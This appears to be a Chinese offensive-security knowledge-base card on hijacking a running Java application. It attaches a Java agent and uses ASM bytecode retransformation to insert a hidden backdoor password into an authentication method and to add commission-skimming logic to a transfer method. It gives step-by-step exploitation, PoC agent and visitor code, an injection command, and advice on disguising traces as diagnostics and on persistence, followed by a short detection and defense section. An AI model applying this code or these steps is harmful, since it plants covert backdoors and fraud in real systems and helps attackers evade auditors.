---
id: web-java-classloader-asm-retransform-auth-bypass
title: ASM + Instrumentation 热替换：Attach Agent 篡改认证与业务逻辑
type: scenario
domain: web
path: web/java/classloader
technique: asm-instrumentation-retransform-hijack
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- asm
- instrumentation
- java-agent
- attach-api
- bytecode
- auth-bypass
- memshell
cve: []
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:38:01+08:00'
  notes: 已对照原文与截图核对 Attach Agent 注入、ASM retransform、descriptor 定位、COMPUTE_FRAMES+SKIP_FRAMES、后门密码与佣金篡改结果；未验证点：未在本机复现，依赖原文 curl/控制台截图；前提为同用户/JVM 操作权限的后渗透场景
url: /docs/web/java/classloader/web-java-classloader-asm-retransform-auth-bypass/
draft: false
kb_aliases:
- ASM 字节码劫持
- Java Agent 热替换
- retransformClasses 认证绕过
- Attach API 注入 Agent
- 运行时字节码篡改
- 无文件后门
- Instrumentation 改方法体
---

## 一句话结论

在已获得目标 JVM 同用户权限的前提下，通过 Attach API 动态加载 Agent，再用 `Instrumentation.retransformClasses()` 配合 ASM 改写已加载类的方法体，可以在不重启、不改文件、不新增类的情况下插入后门认证密码或篡改业务逻辑；正常业务行为保持不变，检测难度高于传统内存马。

## 原理

- JDK 5 起提供 `java.lang.instrument`：Agent 可通过 `redefineClasses()` / `retransformClasses()` 替换**已加载类**的字节码。两者都不能增删方法/字段或改变继承关系（schema 不变），但**方法体内部字节码可以完全替换**；认证判断、金额校验、权限分支都发生在方法体内，因此足够劫持业务逻辑。
- Attach API 的底层流程：attacher 创建 `/tmp/.attach_pid<pid>`，向目标 JVM 发 `SIGQUIT`；目标 JVM 的 Signal Dispatcher 发现标记文件后启动 Attach Listener，创建 Unix 域套接字 `/tmp/.java_pid<pid>`；attacher 通过套接字发送 `load instrument agent.jar`，目标 JVM 加载 Agent 并调用 `agentmain`。前提是攻击者与目标 JVM 同用户、未设置 `-XX:+DisableAttachMechanism`。
- Agent JAR 的 `MANIFEST.MF` 必须声明 `Agent-Class`（Attach 入口）、`Premain-Class`（`-javaagent` 启动入口）、`Can-Retransform-Classes: true`（否则 `addTransformer(tf,true)` 抛 `UnsupportedOperationException`）；Agent 通过 Attach 加载时不使用目标应用 classpath，ASM 依赖必须 shade 进自身 JAR。
- 向 `Instrumentation` 注册 `ClassFileTransformer` 后调用 `retransformClasses(target)`，JVM 会把原始字节码交给所有 transformer。transformer 用 ASM `ClassReader` 解析、`ClassWriter` 输出，通过 `MethodVisitor` 在 `visitCode()`（方法入口）或 `visitInsn(ARETURN)`（返回前）插入指令。
- 关键工程细节：
  - 用 `方法名 + descriptor` 精确匹配目标方法（如 `authenticate` + `(Ljava/lang/String;Ljava/lang/String;)Z`），避免误改重载方法；
  - 局部变量槽位必须与 `javap -v` 的 `LocalVariableTable` 一致（实例方法 slot0=this、slot1=username、slot2=password），否则 `ALOAD` 取错变量；
  - `ClassWriter.COMPUTE_FRAMES` + `ClassReader.SKIP_FRAMES` 自动重算 StackMapTable，避免插入分支后 `VerifyError`；
  - 插入的指令必须保持操作数栈平衡（返回前插入逻辑时用 `DUP` 保留返回值，分支汇合处栈状态一致）。
- 认证绕过注入等价于在方法开头插入 `if ("__rt_diag__".equals(password)) return true;`：`LDC "__rt_diag__"` → `ALOAD 2` → `String.equals` → `IFEQ originalLogic` → `ICONST_1` → `IRETURN`，不匹配则跳回原始逻辑。
- 业务逻辑篡改在 `ARETURN` 前插入：`DUP` 复制返回值 → `startsWith("SUCCESS")` 判断 → 条件成立时输出佣金日志；无论分支如何，返回值始终留在栈顶供 `ARETURN` 使用，因此不影响正常返回。
- 改写完成后立即 `removeTransformer` 并只设置一个伪装成“运行时诊断”的系统属性，减少可观测痕迹；Agent 自身打印也伪装为 `[RT-Support]` 运维日志。

## 触发条件

1. 攻击者已获得目标 JVM 进程同用户权限（WebShell/RCE/容器逃逸后的后渗透阶段）。
2. 目标 JVM 未禁用 Attach（未设置 `-XX:+DisableAttachMechanism`），且 `/tmp` 可写、`jdk.attach` 模块可用。
3. 目标类已加载（`retransformClasses` 只作用于已加载类；未加载类可用 `addTransformer` 拦截后续加载）。
4. 目标方法体是攻击目标（认证、转账、权限判断等），且 schema 不需要改变。

## 利用步骤

1. 用 `javap -c -p -v` 分析目标类，确认方法名、descriptor、局部变量槽位与分支结构。
2. 编写 Agent：`agentmain` 中注册 transformer，调用 `retransformClasses` 改写目标类，随后移除 transformer。
3. 编写 ASM Visitor：按名称 + descriptor 定位方法，在 `visitCode()` 或 `ARETURN` 前插入指令；使用 `COMPUTE_FRAMES + SKIP_FRAMES`。
4. 编译打包为 fat JAR（shade ASM），在 MANIFEST 写入 `Agent-Class`、`Premain-Class`、`Can-Retransform-Classes: true`。
5. 用 `VirtualMachine.attach(pid)` + `loadAgent(jarPath)` 注入；也可按进程名关键字自动查找 PID。
6. 验证：后门密码对任意用户名生效、正常密码/错误密码行为不变、业务篡改仅在成功路径触发。
7. 清理 transformer 与 JAR，进入持久化阶段（见独立卡片）。

## PoC

Agent 入口：

```java
public class AgentMain {
    public static void agentmain(String args, Instrumentation inst) {
        HijackTransformer tf = new HijackTransformer();
        inst.addTransformer(tf, true);
        for (Class<?> c : inst.getAllLoadedClasses()) {
            if (c.getName().equals("com.victim.service.AuthService")
                || c.getName().equals("com.victim.service.TransferService")) {
                inst.retransformClasses(c);
            }
        }
        inst.removeTransformer(tf);
    }
}
```

认证绕过 Visitor：

```java
if ("authenticate".equals(name)
    && "(Ljava/lang/String;Ljava/lang/String;)Z".equals(descriptor)) {
    return new MethodVisitor(ASM9, mv) {
        @Override public void visitCode() {
            super.visitCode();
            Label original = new Label();
            mv.visitLdcInsn("__rt_diag__");
            mv.visitVarInsn(ALOAD, 2);                    // password
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String",
                "equals", "(Ljava/lang/Object;)Z", false);
            mv.visitJumpInsn(IFEQ, original);
            mv.visitInsn(ICONST_1);
            mv.visitInsn(IRETURN);
            mv.visitLabel(original);
        }
    };
}
```

返回前篡改（转账佣金）：

```java
@Override public void visitInsn(int opcode) {
    if (opcode == ARETURN) {
        mv.visitInsn(DUP);                                // 保留返回值
        mv.visitLdcInsn("SUCCESS");
        mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String",
            "startsWith", "(Ljava/lang/String;)Z", false);
        Label skip = new Label();
        mv.visitJumpInsn(IFEQ, skip);
        // GETSTATIC System.out ... StringBuilder 拼接 "[COMMISSION] ..." ... println
        mv.visitLabel(skip);
    }
    super.visitInsn(opcode);
}
```

注入：

```bash
java --add-modules jdk.attach -jar malicious-agent-1.0.0.jar <PID>
```

原文实测：注入后 `username=anyone&password=__rt_diag__`、`username=root&password=__rt_diag__` 均返回 `LOGIN_SUCCESS`；`admin/admin` 仍成功、`admin/wrong` 仍失败；转账 50000 时控制台出现 `[COMMISSION] ACCT-001 -> OFFSHORE-8829-XX: $0.01`，负数金额仍返回 `FAILED: Invalid amount` 且不触发佣金。

## 变体与关联

- 同一原语可篡改任意方法体：权限校验、金额/汇率计算、风控开关、加解密结果、审计日志。
- 可在 `addTransformer` 阶段拦截尚未加载的类（不调用 retransform），实现新加载类的持久劫持。
- 与 JSP/ClassLoader 内存马相比：不新增类、不注册 Servlet/Filter，只改已加载类的方法体，文件与路由层面均无新增痕迹；但 Attach 与 retransform 会在 JFR 中留事件。
- 持久化可叠加 `JAVA_TOOL_OPTIONS` + `-javaagent`（见独立卡片）或 cron 重注入脚本。
- Attach 依赖同用户权限；容器共享 `/tmp` 场景可通过 Attach Socket 跨容器注入，属同类前置条件。

## 检测与防御

- JFR 持续记录并导出 `jdk.RetransformClasses`、`jdk.ClassRedefinition` 事件：可看到发起线程 `Attach Listener`、目标类、`redefinitionId` 与完整调用栈（含恶意 Agent 类名/方法名/行号）。前提是攻击前已启动 JFR。
- 监控 `System.setProperty` 新增的可疑属性、`jcmd <pid> VM.system_properties` 与启动基线的差异。
- 审计 Attach：监控 `/tmp/.attach_pid*`、`/tmp/.java_pid*` 文件与 `SIGQUIT`，限制 `jdk.attach` 使用；高安全场景可设置 `-XX:+DisableAttachMechanism`（代价是失去 jcmd/jstack/JFR 等诊断能力）。
- 建立运行时字节码完整性校验（Agent/ClassFileTransformer 注册审计、类字节码哈希比对），作为不禁用 Attach 时的补偿控制。
- 监控 JVM 动态加载 Agent 的警告 `A Java agent has been loaded dynamically`，以及异常线程名（如伪装成 `JVM-GC-Monitor-Worker`）。
